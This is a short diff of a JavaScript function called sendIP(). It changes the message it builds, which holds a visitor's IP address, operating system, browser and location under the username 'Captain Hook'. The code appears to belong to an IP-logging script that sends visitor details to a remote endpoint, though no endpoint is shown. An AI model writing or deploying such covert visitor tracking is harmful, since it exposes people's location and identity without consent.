@@ -36,7 +36,7 @@ async function sendIP() {
 
     //create payload
     const payload = {
-      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Location: ${data}`,
+      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Location: ${user_data}`,
       username: 'Captain Hook'
     };
 
